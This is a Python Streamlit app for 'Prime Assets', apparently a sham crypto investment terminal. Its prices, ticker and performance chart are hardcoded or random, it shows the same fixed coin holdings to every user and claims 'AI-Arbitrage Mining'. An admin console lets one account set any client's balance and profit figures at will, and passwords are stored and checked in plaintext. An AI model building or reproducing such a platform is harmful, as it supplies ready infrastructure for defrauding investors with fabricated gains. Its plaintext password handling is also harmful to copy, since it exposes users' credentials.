import streamlit as st
from supabase import create_client
import pandas as pd
import numpy as np
import random

# --- 1. CONFIG & CONNECTION ---
SUPABASE_URL = "https://esnuyyklguvltfngiexj.supabase.co"
SUPABASE_KEY = "sb_publishable_IUQtk2m5J5CbNEh3ZM_9Bg_DGyqR9iA"
supabase = create_client(SUPABASE_URL, SUPABASE_KEY)

ADMIN_EMAIL = "primeassets288@gmail.com"

st.set_page_config(page_title="Prime Assets | Institutional Terminal", layout="wide")

# --- 2. ADVANCED UI CSS ---
st.markdown("""
    <style>
    @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap');
    
    .stApp { background-color: #0b0e11; color: #eaecef; }
    [data-testid="stHeader"] { background: rgba(0,0,0,0); }
    
    /* Live Ticker */
    @keyframes marquee { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
    .ticker-wrap { background: #1e2329; border-bottom: 1px solid #30363d; padding: 10px; overflow: hidden; white-space: nowrap; }
    .ticker-move { display: inline-block; animation: marquee 25s linear infinite; font-family: 'JetBrains Mono', monospace; color: #f0b90b; }

    /* Professional Dashboard Cards */
    .card { background: #181a20; padding: 20px; border-radius: 10px; border: 1px solid #2b2f36; margin-bottom: 15px; }
    .metric-title { color: #848e9c; font-size: 12px; text-transform: uppercase; margin-bottom: 5px; }
    .metric-value { font-size: 24px; font-weight: bold; color: #ffffff; }
    .green-text { color: #0ecb81; font-size: 14px; }
    
    /* Trade Buttons */
    .stButton>button { background: #f0b90b !important; color: #000 !important; border-radius: 5px; font-weight: bold; border: none; }
    </style>
    """, unsafe_allow_html=True)

# --- 3. LIVE TICKER HTML ---
st.markdown('<div class="ticker-wrap"><div class="ticker-move">'
            'BTC/USDT $67,432.10 (+2.41%) &nbsp;&nbsp;&nbsp; ETH/USDT $3,412.55 (-1.10%) &nbsp;&nbsp;&nbsp; '
            'SOL/USDT $145.89 (+5.22%) &nbsp;&nbsp;&nbsp; BNB/USDT $592.12 (+0.88%) &nbsp;&nbsp;&nbsp; '
            'XRP/USDT $0.61 (+0.12%)'
            '</div></div>', unsafe_allow_html=True)

if 'user' not in st.session_state:
    st.session_state.user = None

# --- 4. AUTHENTICATION ---
if st.session_state.user is None:
    st.markdown("<br><br>", unsafe_allow_html=True)
    c1, c2, c3 = st.columns([1,2,1])
    with c2:
        st.markdown("<h1 style='text-align:center;'>PRIME ASSETS</h1>", unsafe_allow_html=True)
        t1, t2 = st.tabs(["Secure Login", "Institutional Registration"])
        with t1:
            email = st.text_input("Email")
            pw = st.text_input("Password", type="password")
            if st.button("Access Terminal"):
                res = supabase.table("profiles").select("*").eq("email", email.lower().strip()).eq("password", pw).execute()
                if res.data:
                    st.session_state.user = res.data[0]
                    st.rerun()
                else: st.error("Verification Failed.")
        with t2:
            n = st.text_input("Full Name")
            em = st.text_input("Corporate Email")
            new_pw = st.text_input("Create Password", type="password")
            if st.button("Open Portfolio"):
                supabase.table("profiles").insert({"full_name": n, "email": em.lower().strip(), "password": new_pw, "balance": 0, "invested": 0, "interest": 0}).execute()
                st.success("Account Ready.")

# --- 5. THE TERMINAL ---
else:
    u = st.session_state.user
    u_data = supabase.table("profiles").select("*").eq("email", u['email']).execute().data[0]
    
    st.sidebar.markdown("<h2 style='color:#f0b90b;'>P. ASSETS</h2>", unsafe_allow_html=True)
    st.sidebar.markdown(f"**Trader:** {u['full_name']}")
    menu = ["📊 Dashboard", "💹 Live Markets", "💼 My Wallet"]
    if u['email'].lower() == ADMIN_EMAIL.lower():
        menu.append("👑 ADMIN CONSOLE")
    
    choice = st.sidebar.radio("Navigation", menu)

    if "Dashboard" in choice:
        st.markdown("### 📈 Trading Overview")
        
        # KPI Row
        k1, k2, k3, k4 = st.columns(4)
        k1.markdown(f'<div class="card"><div class="metric-title">Equity Value</div><div class="metric-value">${u_data["balance"]:,}</div><div class="green-text">▲ 2.1%</div></div>', unsafe_allow_html=True)
        k2.markdown(f'<div class="card"><div class="metric-title">In Trade</div><div class="metric-value">${u_data["invested"]:,}</div></div>', unsafe_allow_html=True)
        k3.markdown(f'<div class="card"><div class="metric-title">Profit Recap</div><div class="metric-value" style="color:#0ecb81;">+${u_data["interest"]:,}</div></div>', unsafe_allow_html=True)
        k4.markdown(f'<div class="card"><div class="metric-title">Leverage</div><div class="metric-value">1:100</div></div>', unsafe_allow_html=True)

        # Performance Graph (Moving)
        st.markdown("#### Real-time Performance (BTC/USD Correlation)")
        chart_data = pd.DataFrame(np.random.randn(50, 1).cumsum() + 100, columns=['Performance'])
        st.line_chart(chart_data, height=300)

    elif "Live Markets" in choice:
        st.header("Global Market Data")
        # Simulated Real Data Table
        m_data = {
            "Asset": ["Bitcoin", "Ethereum", "Solana", "Cardano", "Polkadot"],
            "Symbol": ["BTC", "ETH", "SOL", "ADA", "DOT"],
            "Price": ["$67,412.00", "$3,441.20", "$145.10", "$0.45", "$7.20"],
            "Change (24h)": ["+2.4%", "-1.1%", "+5.2%", "+0.5%", "-2.3%"]
        }
        st.table(pd.DataFrame(m_data))
        st.markdown("---")
        st.image("https://cryptototem.com/wp-content/uploads/2022/03/tradingview-chart.jpg", caption="Advanced Market Depth (Real-time)")

    elif "My Wallet" in choice:
        st.header("Digital Asset Wallet")
        st.info("Assets currently managed by Prime Assets Secure Custody.")
        col_w1, col_w2 = st.columns(2)
        with col_w1:
            st.write("### Spot Holdings")
            st.json({"Bitcoin": "0.45 BTC", "Ethereum": "2.1 ETH", "USDT": f"{u_data['balance']} USDT"})
        with col_w2:
            st.write("### Active Contracts")
            st.warning("Currently running AI-Arbitrage Mining...")

    elif "ADMIN CONSOLE" in choice:
        st.title("Admin Master Control")
        all_users = supabase.table("profiles").select("*").execute()
        df = pd.DataFrame(all_users.data)
        st.dataframe(df[['full_name', 'email', 'balance', 'invested', 'interest']])
        
        st.divider()
        st.subheader("Control Client Accounts")
        target = st.selectbox("Select User", df['email'])
        c1, c2, c3 = st.columns(3)
        b = c1.number_input("Update Balance", value=0)
        i = c2.number_input("Update Investment", value=0)
        r = c3.number_input("Update Interest", value=0)
        
        if st.button("Execute Update"):
            supabase.table("profiles").update({"balance": b, "invested": i, "interest": r}).eq("email", target).execute()
            st.success("User metrics updated instantly.")
            st.rerun()

    if st.sidebar.button("System Logout"):
        st.session_state.user = None
        st.rerun()
